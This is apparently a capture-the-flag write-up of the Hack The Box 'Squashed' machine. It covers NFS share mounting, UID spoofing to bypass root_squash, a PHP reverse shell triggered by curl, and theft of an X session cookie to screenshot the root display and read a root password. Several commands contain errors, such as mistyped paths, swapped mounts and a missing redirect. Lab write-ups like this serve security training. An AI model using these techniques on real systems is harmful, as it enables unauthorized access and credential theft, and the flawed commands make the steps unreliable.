---
title: Squashed Machine HTB
date: 2023-02-1 00:18:00 +0700
categories: [TOP_CATEGORIE, SUB_CATEGORIE]
tags: [machines]
---

# Enumeration 

```ruby
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
| 3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|_ 256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_ 256 18cd9d08a621a8b8b8b6f79f8d405154fb (ED25519)
80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Built Better
|_http-server-header: Apache/2.4.41 (Ubuntu)
111/tcp open rpcbind 2-4 (RPC #100000)
| rpcinfo: 
| program version port/proto service
| 100000 2,3,4 111/tcp rpcbind
| 100000 2,3,4 111/udp rpcbind
| 100000 3,3,4 111/tcp6 rpcbind
| 100000 3,4 111/udp6 rpcbind | 100003 3 2049/udp6 rpcbind
| 100003 3 2049/udp nfs
| 100003 3 2049/udp6 nfs
| 100003 3,4 2049/tcp nfs
| 100003 3,4 2049/tcp6 nfs | 100003 3,4 2049/tcp6 nfs
| 100005 1,2,3 36642/udp mountd
| 100005 1,2,3 38681/tcp6 mountd
| 100005 1,2,3 41607/tcp mountd
| 100005 1,2,3 47278/udp6 mountd
| 100021 1,3,4 35343/tcp nlockmgr
| 100021 1,3,4 37670/udp6 nlockmgr
| 100021 1,3,4 39313/tcp6 nlockmgr
| 100021 1,3,4 54678/udp nlockmgr
| 100227 3 2049/tcp nfs_acl
| 100227 3 2049/tcp6 nfs_acl
| | 100227 3 2049/udp nfs_acl
| |_ 100227 3 2049/udp6 nfs_acl
2049/tcp open nfs_acl 3 (RPC #100227)
```

## User exploit
There is not much we can do on the web page. It seems to be a bottomless pit, but we have port 111 open, so let's take a look at it:
```bash
showmount -e 10.129.217.14
```
and we see that it reports this:

```bash
/home/ross *
/var/www/html *
```

so let's mount both directories:

```bash
sudo mount -t nfs squashed.htb:/var/wwwww/html /tmp/html
sudo mount -t nfs squashed.htb:/var/www/html /tmp/ross
```

However, we cannot see the contents of the html folder, as a user with the UID 2017 is needed, so let's create one:

```bash
sudo useradd xela
sudo usermod -u 2017 xela
sudo groupmod -g 2017 xela
```

and with this we can see the /html folder. So we are going to upload an R.E to this folder, listening on X port and doing a curl to receive it:

```shell
curl http://squashed.htb/shell.php
```

## Root exploit 

if we look at the `/etc/exports` file we see the following:

```bash
/var/www/html *(rw, sync, root_squash)
/home/ross *(sync,root_squash)
```

So we can only read and write inside the html directory.

If we look inside the Ross directory, we can see that only users with the UID 1001 can interact, so let's create another user with that UID (inside our local machine)

```shell
sudo useradd ssor
sudo usermod -u 1001 ssor
sudo groupmod -g 1001 ssor
sudo su su ssor
```

Inside the /home/ross directory we can see the existence of the `Xauthority` and `xession` files, so we can do the escalation here.

So, let's take the session cookie out of /home/ross 

```shell
cat /home/ross/.Xauthority | base 64
this returns the cookie
```

And insert it on the victim machine:

```shell
echo "cookie" | base64 -d /tmp/.Xauthority
```

And change the current cookie of the victim machine to ross' cookie:

```shell
export XAUTHORITY=/tmp/.Xauthority
```

Once we have the ross session, we can use xwd to take screenshots of the root session:

```shell
xwd -root -screen -silent -display :0 > /tmp/screen.xwd
-root: select root window
-screen: send GetImage request to root window
-silent: operate silently
-display: specify server to connect to
```

once we have this screenshot, we are going to move it to our local machine from the `/tmp` folder using a python server

```shell
python3 -m http.server
```

We download it to our local machine and convert it to a png:

```shell
wget http://squashed.htb:8000/screen.xwd
convert screen.xwd screen.png
```

And this way we can see the root credentials:
```shell
root:cah$mei7rai9A
```

